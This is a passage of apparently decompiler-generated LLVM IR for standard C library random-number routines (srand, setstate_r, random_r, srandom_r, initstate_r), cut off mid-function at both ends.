  %v0_1000b6c8 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_100248f4.625 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000b6fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b6fc, i32* @r3, align 4
  %v0_1000b718 = call i32 @__pthread_return_void()
  %v0_1000b720 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_100248f0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268482356, i32* @lr, align 4
  %v0_1000b730 = call i32 @srandom_r()
  store i32 %v2_1000b6fc, i32* @r3, align 4
  %v0_1000b73c = call i32 @__pthread_return_void()
  ret i32 %v0_1000b73c

; uselistorder directives
  uselistorder i32* @global_var_100248f0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100248f0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000b754 = add i32 %tmp, 12
  %v2_1000b754 = inttoptr i32 %v1_1000b754 to i32*
  %v3_1000b754 = load i32, i32* %v2_1000b754, align 4
  store i32 %v3_1000b754, i32* %r11.global-to-local, align 4
  %v0_1000b758 = load i32, i32* @lr, align 4
  store i32 %v0_1000b758, i32* %r0.global-to-local, align 4
  %v1_1000b760 = add i32 %arg1, 4
  store i32 %v1_1000b760, i32* %r3.global-to-local, align 4
  %v3_1000b764 = icmp eq i32 %v3_1000b754, 0
  %v1_1000b768 = add i32 %tmp, 8
  %v2_1000b768 = inttoptr i32 %v1_1000b768 to i32*
  %v3_1000b768 = load i32, i32* %v2_1000b768, align 4
  store i32 %v3_1000b768, i32* %r9.global-to-local, align 4
  br i1 %v3_1000b764, label %dec_label_pc_1000b774, label %dec_label_pc_1000b77c

dec_label_pc_1000b774:                            ; preds = %entry
  %v2_1000b774 = add i32 %v3_1000b768, -4
  %v3_1000b774 = inttoptr i32 %v2_1000b774 to i32*
  store i32 0, i32* %v3_1000b774, align 4
  br label %dec_label_pc_1000b794

dec_label_pc_1000b77c:                            ; preds = %entry
  %v1_1000b77c = add i32 %tmp, 4
  %v2_1000b77c = inttoptr i32 %v1_1000b77c to i32*
  %v3_1000b77c = load i32, i32* %v2_1000b77c, align 4
  %v2_1000b780 = sub i32 %v3_1000b77c, %v3_1000b768
  %v4_1000b784 = sdiv i32 %v2_1000b780, 4
  %v1_1000b788 = mul i32 %v4_1000b784, 5
  %v2_1000b78c = add i32 %v1_1000b788, %v3_1000b754
  store i32 %v2_1000b78c, i32* %r0.global-to-local, align 4
  %v2_1000b790 = add i32 %v3_1000b768, -4
  %v3_1000b790 = inttoptr i32 %v2_1000b790 to i32*
  store i32 %v2_1000b78c, i32* %v3_1000b790, align 4
  br label %dec_label_pc_1000b794

dec_label_pc_1000b794:                            ; preds = %dec_label_pc_1000b774, %dec_label_pc_1000b77c
  %v0_1000b794 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b794 = add i32 %v0_1000b794, -4
  %v2_1000b794 = inttoptr i32 %v1_1000b794 to i32*
  %v3_1000b794 = load i32, i32* %v2_1000b794, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100134f4.626 to i32), i32* %r9.global-to-local, align 4
  %v2_1000b7a4 = srem i32 %v3_1000b794, 5
  store i32 %v2_1000b7a4, i32* %r11.global-to-local, align 4
  %v2_1000b7b4 = icmp ugt i32 %v2_1000b7a4, 4
  %v1_1000b7b8 = mul nsw i32 %v2_1000b7a4, 4
  store i32 %v1_1000b7b8, i32* %r0.global-to-local, align 4
  %v2_1000b7c0 = add i32 %v1_1000b7b8, ptrtoint (i32* @global_var_100134f4.626 to i32)
  store i32 %v2_1000b7c0, i32* %r10.global-to-local, align 4
  br i1 %v2_1000b7b4, label %dec_label_pc_1000b824, label %dec_label_pc_1000b7c8

dec_label_pc_1000b7c8:                            ; preds = %dec_label_pc_1000b794
  %v3_1000b7bc = icmp eq i32 %v2_1000b7a4, 0
  %v1_1000b7c8 = add i32 %v1_1000b7b8, add (i32 ptrtoint (i32* @global_var_100134f4.626 to i32), i32 20)
  %v2_1000b7c8 = inttoptr i32 %v1_1000b7c8 to i32*
  %v3_1000b7c8 = load i32, i32* %v2_1000b7c8, align 4
  store i32 %v3_1000b7c8, i32* %r10.global-to-local, align 4
  %v3_1000b7cc = inttoptr i32 %v2_1000b7c0 to i32*
  %v4_1000b7cc = load i32, i32* %v3_1000b7cc, align 4
  store i32 %v4_1000b7cc, i32* %r9.global-to-local, align 4
  %v1_1000b7d0 = mul i32 %v3_1000b7c8, 4
  store i32 %v1_1000b7d0, i32* %r0.global-to-local, align 4
  %v2_1000b7d4 = add i32 %tmp, 16
  %v3_1000b7d4 = inttoptr i32 %v2_1000b7d4 to i32*
  store i32 %v3_1000b7c8, i32* %v3_1000b7d4, align 4
  %v0_1000b7d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b7d8 = add i32 %tmp, 20
  %v3_1000b7d8 = inttoptr i32 %v2_1000b7d8 to i32*
  store i32 %v0_1000b7d8, i32* %v3_1000b7d8, align 4
  %v0_1000b7dc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b7dc = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b7dc = add i32 %v1_1000b7dc, %v0_1000b7dc
  store i32 %v2_1000b7dc, i32* %r8.global-to-local, align 4
  %v0_1000b7e0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b7e0, i32* %v2_1000b754, align 4
  br i1 %v3_1000b7bc, label %dec_label_pc_1000b818, label %dec_label_pc_1000b7e8

dec_label_pc_1000b7e8:                            ; preds = %dec_label_pc_1000b7c8
  %v0_1000b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b7e8 = add i32 %v0_1000b7e8, -4
  %v2_1000b7e8 = inttoptr i32 %v1_1000b7e8 to i32*
  %v3_1000b7e8 = load i32, i32* %v2_1000b7e8, align 4
  %v1_1000b7ec = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b7ec = sdiv i32 %v3_1000b7e8, %v1_1000b7ec
  %v1_1000b7f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b7f0 = add i32 %v1_1000b7f0, %v2_1000b7ec
  store i32 %v2_1000b7f0, i32* %r9.global-to-local, align 4
  %v1_1000b7f4 = mul i32 %v2_1000b7ec, 4
  %v1_1000b7f8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b7f8 = sdiv i32 %v2_1000b7f0, %v1_1000b7f8
  store i32 %v2_1000b7f8, i32* %r11.global-to-local, align 4
  %v2_1000b7fc = add i32 %v1_1000b7f4, %v0_1000b7e8
  store i32 %v2_1000b7fc, i32* %r0.global-to-local, align 4
  %v2_1000b800 = add i32 %tmp, 4
  %v3_1000b800 = inttoptr i32 %v2_1000b800 to i32*
  store i32 %v2_1000b7fc, i32* %v3_1000b800, align 4
  %v0_1000b804 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b804 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b804 = mul i32 %v1_1000b804, %v0_1000b804
  store i32 %v2_1000b804, i32* %r11.global-to-local, align 4
  %v1_1000b808 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b808 = sub i32 %v1_1000b808, %v2_1000b804
  %v1_1000b80c = mul i32 %v2_1000b808, 4
  %v0_1000b810 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b810 = add i32 %v1_1000b80c, %v0_1000b810
  store i32 %v2_1000b810, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b810, i32* %arg2, align 4
  br label %dec_label_pc_1000b818

dec_label_pc_1000b818:                            ; preds = %dec_label_pc_1000b7c8, %dec_label_pc_1000b7e8
  %v0_1000b818 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b818 = add i32 %tmp, 24
  %v3_1000b818 = inttoptr i32 %v2_1000b818 to i32*
  store i32 %v0_1000b818, i32* %v3_1000b818, align 4
  %v0_1000b81c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b81c, i32* %v2_1000b768, align 4
  %v0_1000b838.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b834

dec_label_pc_1000b824:                            ; preds = %dec_label_pc_1000b794
  %v0_1000b824 = call i32 @__errno_location()
  store i32 %v0_1000b824, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b82c = inttoptr i32 %v0_1000b824 to i32*
  store i32 22, i32* %v2_1000b82c, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b834

dec_label_pc_1000b834:                            ; preds = %dec_label_pc_1000b818, %dec_label_pc_1000b824
  %v0_1000b838 = phi i32 [ %v0_1000b838.pre, %dec_label_pc_1000b818 ], [ -1, %dec_label_pc_1000b824 ]
  store i32 %v0_1000b758, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b838, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b838

; uselistorder directives
  uselistorder i32 %v0_1000b838, { 1, 0 }
  uselistorder i32 %v3_1000b7c8, { 1, 0, 2 }
  uselistorder i32 %v1_1000b7b8, { 2, 1, 0 }
  uselistorder i32 %v2_1000b7a4, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 6, 5, 4, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000b834, { 1, 0 }
  uselistorder label %dec_label_pc_1000b818, { 1, 0 }
  uselistorder label %dec_label_pc_1000b794, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000b848 = add i32 %tmp, 12
  %v2_1000b848 = inttoptr i32 %v1_1000b848 to i32*
  %v3_1000b848 = load i32, i32* %v2_1000b848, align 4
  %v1_1000b854 = add i32 %tmp, 8
  %v2_1000b854 = inttoptr i32 %v1_1000b854 to i32*
  %v3_1000b854 = load i32, i32* %v2_1000b854, align 4
  store i32 %v3_1000b854, i32* %r7.global-to-local, align 4
  %v3_1000b858 = icmp eq i32 %v3_1000b848, 0
  br i1 %v3_1000b858, label %dec_label_pc_1000b860, label %dec_label_pc_1000b87c

dec_label_pc_1000b860:                            ; preds = %entry
  %v1_1000b860 = inttoptr i32 %v3_1000b854 to i32*
  %v2_1000b860 = load i32, i32* %v1_1000b860, align 4
  %v2_1000b864 = mul i32 %v2_1000b860, 1103515245
  %v1_1000b868 = add i32 %v2_1000b864, 12345
  %v1_1000b86c = urem i32 %v1_1000b868, -2147483648
  store i32 %v1_1000b86c, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b86c, i32* %v1_1000b860, align 4
  %v0_1000b874 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b874 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b874, i32* %v2_1000b874, align 4
  br label %dec_label_pc_1000b8d0

dec_label_pc_1000b87c:                            ; preds = %entry
  %v2_1000b87c = load i32, i32* %arg1, align 4
  %v1_1000b880 = add i32 %tmp, 4
  %v2_1000b880 = inttoptr i32 %v1_1000b880 to i32*
  %v3_1000b880 = load i32, i32* %v2_1000b880, align 4
  store i32 %v3_1000b880, i32* %r9.global-to-local, align 4
  %v1_1000b884 = add i32 %tmp, 24
  %v2_1000b884 = inttoptr i32 %v1_1000b884 to i32*
  %v3_1000b884 = load i32, i32* %v2_1000b884, align 4
  %v1_1000b888 = add i32 %v2_1000b87c, 4
  store i32 %v1_1000b888, i32* @r8, align 4
  %v1_1000b88c = add i32 %v3_1000b880, 4
  %v1_1000b890 = inttoptr i32 %v3_1000b880 to i32*
  %v2_1000b890 = load i32, i32* %v1_1000b890, align 4
  store i32 %v2_1000b890, i32* %r9.global-to-local, align 4
  %v2_1000b894 = icmp ult i32 %v1_1000b888, %v3_1000b884
  %v1_1000b89c = inttoptr i32 %v2_1000b87c to i32*
  %v2_1000b89c = load i32, i32* %v1_1000b89c, align 4
  store i32 %v1_1000b88c, i32* %r10.global-to-local, align 4
  %v2_1000b8a4 = add i32 %v2_1000b89c, %v2_1000b890
  %v1_1000b8a8 = udiv i32 %v2_1000b8a4, 2
  store i32 %v1_1000b8a8, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b8a4, i32* %v1_1000b89c, align 4
  %v0_1000b8b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b8b0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b8b0, i32* %v2_1000b8b0, align 4
  br i1 %v2_1000b894, label %dec_label_pc_1000b8c0, label %dec_label_pc_1000b8b8

dec_label_pc_1000b8b8:                            ; preds = %dec_label_pc_1000b87c
  %v0_1000b8b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b8b8, i32* @r8, align 4
  br label %dec_label_pc_1000b8c8

dec_label_pc_1000b8c0:                            ; preds = %dec_label_pc_1000b87c
  %v2_1000b898 = icmp ult i32 %v1_1000b88c, %v3_1000b884
  br i1 %v2_1000b898, label %dec_label_pc_1000b8c8, label %dec_label_pc_1000b8c4

dec_label_pc_1000b8c4:                            ; preds = %dec_label_pc_1000b8c0
  %v0_1000b8c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b8c4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b8c8

dec_label_pc_1000b8c8:                            ; preds = %dec_label_pc_1000b8c0, %dec_label_pc_1000b8b8, %dec_label_pc_1000b8c4
  %v0_1000b8c8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b8c8, i32* %v2_1000b880, align 4
  %v0_1000b8cc = load i32, i32* @r8, align 4
  store i32 %v0_1000b8cc, i32* %arg1, align 4
  br label %dec_label_pc_1000b8d0

dec_label_pc_1000b8d0:                            ; preds = %dec_label_pc_1000b860, %dec_label_pc_1000b8c8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000b8a4, { 1, 0 }
  uselistorder i32 %v1_1000b88c, { 1, 0 }
  uselistorder i32 %v3_1000b880, { 1, 0, 2 }
  uselistorder i32 %v1_1000b86c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8c8, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000b8d8 = load i32, i32* @lr, align 4
  %v0_1000b8e4 = load i32, i32* @r4, align 4
  store i32 %v0_1000b8e4, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000b8f0 = add i32 %v0_1000b8e4, 12
  %v2_1000b8f0 = inttoptr i32 %v1_1000b8f0 to i32*
  %v3_1000b8f0 = load i32, i32* %v2_1000b8f0, align 4
  %v2_1000b8f4 = icmp ugt i32 %v3_1000b8f0, 4
  br i1 %v2_1000b8f4, label %dec_label_pc_1000b9a4, label %dec_label_pc_1000b8fc

dec_label_pc_1000b8fc:                            ; preds = %entry
  %v0_1000b8fc = load i32, i32* @r3, align 4
  %v3_1000b8fc = icmp eq i32 %v0_1000b8fc, 0
  %v1_1000b900 = add i32 %v0_1000b8e4, 8
  %v2_1000b900 = inttoptr i32 %v1_1000b900 to i32*
  %v3_1000b900 = load i32, i32* %v2_1000b900, align 4
  store i32 %v3_1000b900, i32* %r10.global-to-local, align 4
  br i1 %v3_1000b8fc, label %dec_label_pc_1000b908, label %dec_label_pc_1000b90c

dec_label_pc_1000b908:                            ; preds = %dec_label_pc_1000b8fc
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000b90c

dec_label_pc_1000b90c:                            ; preds = %dec_label_pc_1000b8fc, %dec_label_pc_1000b908
  %v0_1000b910 = phi i32 [ %v0_1000b8fc, %dec_label_pc_1000b8fc ], [ 1, %dec_label_pc_1000b908 ]
  %v3_1000b90c = icmp eq i32 %v3_1000b8f0, 0
  %v2_1000b910 = inttoptr i32 %v3_1000b900 to i32*
  store i32 %v0_1000b910, i32* %v2_1000b910, align 4
  br i1 %v3_1000b90c, label %dec_label_pc_1000b9a0, label %dec_label_pc_1000b918

dec_label_pc_1000b918:                            ; preds = %dec_label_pc_1000b90c
  %v0_1000b918 = load i32, i32* @r30, align 4
  %v1_1000b918 = add i32 %v0_1000b918, 16
  %v2_1000b918 = inttoptr i32 %v1_1000b918 to i32*
  %v3_1000b918 = load i32, i32* %v2_1000b918, align 4
  store i32 %v3_1000b918, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000b930 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000b918, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000b918, 0
  br i1 %tmp18, label %dec_label_pc_1000b96c.preheader, label %dec_label_pc_1000b96c.preheader.thread

dec_label_pc_1000b96c.preheader.thread:           ; preds = %dec_label_pc_1000b918
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b970

dec_label_pc_1000b96c.preheader:                  ; preds = %dec_label_pc_1000b918
  %v1_1000b96c2 = add i32 %v3_1000b918, -1
  store i32 %v1_1000b96c2, i32* %ctr.global-to-local, align 4
  %v2_1000b96c3 = icmp eq i32 %v1_1000b96c2, 0
  br i1 %v2_1000b96c3, label %dec_label_pc_1000b970, label %dec_label_pc_1000b948

dec_label_pc_1000b948:                            ; preds = %dec_label_pc_1000b96c.preheader, %dec_label_pc_1000b968.dec_label_pc_1000b948_crit_edge
  %v1_1000b968 = phi i32 [ %v2_1000b968, %dec_label_pc_1000b968.dec_label_pc_1000b948_crit_edge ], [ %v0_1000b930, %dec_label_pc_1000b96c.preheader ]
  %v1_1000b948 = phi i32 [ %v1_1000b948.pre, %dec_label_pc_1000b968.dec_label_pc_1000b948_crit_edge ], [ 127773, %dec_label_pc_1000b96c.preheader ]
  %v0_1000b948 = load i32, i32* @r3, align 4
  %v2_1000b948 = sdiv i32 %v0_1000b948, %v1_1000b948
  %v2_1000b94c = mul i32 %v2_1000b948, %v1_1000b948
  %v2_1000b950 = sub i32 %v0_1000b948, %v2_1000b94c
  %v1_1000b954 = mul i32 %v2_1000b948, 2836
  store i32 %v1_1000b954, i32* %r0.global-to-local, align 4
  %v1_1000b958 = mul i32 %v2_1000b950, 16807
  %v2_1000b95c = sub i32 %v1_1000b958, %v1_1000b954
  store i32 %v2_1000b95c, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000b95c, -1
  br i1 %tmp19, label %dec_label_pc_1000b968, label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b948
  %v1_1000b964 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b964 = add i32 %v1_1000b964, %v2_1000b95c
  store i32 %v2_1000b964, i32* @r3, align 4
  br label %dec_label_pc_1000b968

dec_label_pc_1000b968:                            ; preds = %dec_label_pc_1000b948, %dec_label_pc_1000b964
  %v0_1000b968 = phi i32 [ %v2_1000b95c, %dec_label_pc_1000b948 ], [ %v2_1000b964, %dec_label_pc_1000b964 ]
  %v2_1000b968 = add i32 %v1_1000b968, 4
  %v3_1000b968 = inttoptr i32 %v2_1000b968 to i32*
  store i32 %v0_1000b968, i32* %v3_1000b968, align 4
  %v0_1000b96c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b96c = add i32 %v0_1000b96c, -1
  store i32 %v1_1000b96c, i32* %ctr.global-to-local, align 4
  %v2_1000b96c = icmp eq i32 %v1_1000b96c, 0
  br i1 %v2_1000b96c, label %dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge, label %dec_label_pc_1000b968.dec_label_pc_1000b948_crit_edge

dec_label_pc_1000b968.dec_label_pc_1000b948_crit_edge: ; preds = %dec_label_pc_1000b968
  %v1_1000b948.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000b948

dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge: ; preds = %dec_label_pc_1000b968
  %v0_1000b970.pre = load i32, i32* @r30, align 4
  %v0_1000b974.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b978.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b970

dec_label_pc_1000b970:                            ; preds = %dec_label_pc_1000b96c.preheader.thread, %dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge, %dec_label_pc_1000b96c.preheader
  %v0_1000b978 = phi i32 [ %v0_1000b978.pre, %dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge ], [ %v0_1000b930, %dec_label_pc_1000b96c.preheader ], [ %v0_1000b930, %dec_label_pc_1000b96c.preheader.thread ]
  %v0_1000b974 = phi i32 [ %v0_1000b974.pre, %dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge ], [ %v3_1000b918, %dec_label_pc_1000b96c.preheader ], [ %v3_1000b918, %dec_label_pc_1000b96c.preheader.thread ]
  %v1_1000b978 = phi i32 [ %v0_1000b970.pre, %dec_label_pc_1000b96c.dec_label_pc_1000b970_crit_edge ], [ %v0_1000b918, %dec_label_pc_1000b96c.preheader ], [ %v0_1000b918, %dec_label_pc_1000b96c.preheader.thread ]
  %v1_1000b970 = add i32 %v1_1000b978, 20
  %v2_1000b970 = inttoptr i32 %v1_1000b970 to i32*
  %v3_1000b970 = load i32, i32* %v2_1000b970, align 4
  store i32 %v3_1000b970, i32* %r0.global-to-local, align 4
  %v1_1000b974 = mul i32 %v0_1000b974, 10
  store i32 %v1_1000b974, i32* %r31.global-to-local, align 4
  %v2_1000b978 = add i32 %v1_1000b978, 4
  %v3_1000b978 = inttoptr i32 %v2_1000b978 to i32*
  store i32 %v0_1000b978, i32* %v3_1000b978, align 4
  %v0_1000b97c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b97c = mul i32 %v0_1000b97c, 4
  %v0_1000b980 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b980 = add i32 %v0_1000b980, %v1_1000b97c
  store i32 %v2_1000b980, i32* %r0.global-to-local, align 4
  %v1_1000b984 = load i32, i32* @r30, align 4
  %v2_1000b984 = inttoptr i32 %v1_1000b984 to i32*
  store i32 %v2_1000b980, i32* %v2_1000b984, align 4
  %v2_1000b998 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000b99021 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b99022 = add i32 %v0_1000b99021, -1
  store i32 %v1_1000b99022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000b99022, -1
  br i1 %tmp2025, label %dec_label_pc_1000b98c, label %dec_label_pc_1000b9a0

dec_label_pc_1000b98c:                            ; preds = %dec_label_pc_1000b970, %dec_label_pc_1000b98c
  %v0_1000b99426 = load i32, i32* @r30, align 4
  %v2_1000b98c = inttoptr i32 %v0_1000b99426 to i32*
  %v3_1000b98c = call i32 @__GI_random_r(i32* %v2_1000b98c, i32 %v2_1000b998)
  %v0_1000b990 = load i32, i32* @r31, align 4
  %v1_1000b990 = add i32 %v0_1000b990, -1
  store i32 %v1_1000b990, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000b990, -1
  br i1 %tmp20, label %dec_label_pc_1000b98c, label %dec_label_pc_1000b9a0

dec_label_pc_1000b9a0:                            ; preds = %dec_label_pc_1000b970, %dec_label_pc_1000b98c, %dec_label_pc_1000b90c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b9a4

dec_label_pc_1000b9a4:                            ; preds = %entry, %dec_label_pc_1000b9a0
  %v0_1000b9a4 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000b9a0 ]
  store i32 %v0_1000b8d8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b9a4

; uselistorder directives
  uselistorder i32 %v1_1000b96c, { 1, 0 }
  uselistorder i32 %v2_1000b968, { 1, 0 }
  uselistorder i32 %v2_1000b95c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000b948, { 1, 0 }
  uselistorder i32 %v0_1000b930, { 1, 2, 0 }
  uselistorder i32 %v3_1000b918, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000b9a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b98c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b968, { 1, 0 }
  uselistorder label %dec_label_pc_1000b948, { 1, 0 }
  uselistorder label %dec_label_pc_1000b90c, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b9bc = icmp ugt i32 %arg2, 127
  %v0_1000b9c4 = load i32, i32* @lr, align 4
  store i32 %v0_1000b9c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v1_1000b9d0 = sub i32 255, %arg2
  %v2_1000b9d0 = sub i32 -1, %arg2
  %not.v5_1000b9d0 = icmp ugt i32 %v1_1000b9d0, %v2_1000b9d0
  %v6_1000b9d4 = sext i1 %not.v5_1000b9d0 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000b9dc = add i32 %tmp, 4
  store i32 %v1_1000b9dc, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100134f4.626 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000b9f4 = sub nsw i32 3, %v6_1000b9d4
  store i32 %v1_1000b9f4, i32* @r31, align 4
  br i1 %v2_1000b9bc, label %dec_label_pc_1000ba1c, label %dec_label_pc_1000b9fc

dec_label_pc_1000b9fc:                            ; preds = %entry
  %v2_1000b9e8 = icmp ugt i32 %arg2, 31
  %v1_1000b9fc = sub i32 63, %arg2
  %not.v5_1000b9fc = icmp ugt i32 %v1_1000b9fc, %v2_1000b9d0
  %v6_1000ba00 = sext i1 %not.v5_1000b9fc to i32
  %v1_1000ba08 = sub nsw i32 1, %v6_1000ba00
  store i32 %v1_1000ba08, i32* @r31, align 4
  br i1 %v2_1000b9e8, label %dec_label_pc_1000ba1c, label %dec_label_pc_1000ba10

dec_label_pc_1000ba10:                            ; preds = %dec_label_pc_1000b9fc
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000ba7c, label %dec_label_pc_1000ba1c

dec_label_pc_1000ba1c:                            ; preds = %dec_label_pc_1000ba10, %dec_label_pc_1000b9fc, %entry
  %v0_1000ba1c = phi i32 [ 0, %dec_label_pc_1000ba10 ], [ %v1_1000ba08, %dec_label_pc_1000b9fc ], [ %v1_1000b9f4, %entry ]
  %v1_1000ba1c = mul nsw i32 %v0_1000ba1c, 4
  store i32 %v1_1000ba1c, i32* %r0.global-to-local, align 4
  %v2_1000ba20 = add i32 %arg3, 12
  %v3_1000ba20 = inttoptr i32 %v2_1000ba20 to i32*
  store i32 %v0_1000ba1c, i32* %v3_1000ba20, align 4
  %v0_1000ba24 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ba24 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ba24 = add i32 %v1_1000ba24, %v0_1000ba24
  store i32 %v2_1000ba24, i32* %r9.global-to-local, align 4
  %v3_1000ba28 = inttoptr i32 %v2_1000ba24 to i32*
  %v4_1000ba28 = load i32, i32* %v3_1000ba28, align 4
  store i32 %v4_1000ba28, i32* %r0.global-to-local, align 4
  %v1_1000ba2c = add i32 %v2_1000ba24, 20
  %v2_1000ba2c = inttoptr i32 %v1_1000ba2c to i32*
  %v3_1000ba2c = load i32, i32* %v2_1000ba2c, align 4
  store i32 %v3_1000ba2c, i32* %r9.global-to-local, align 4
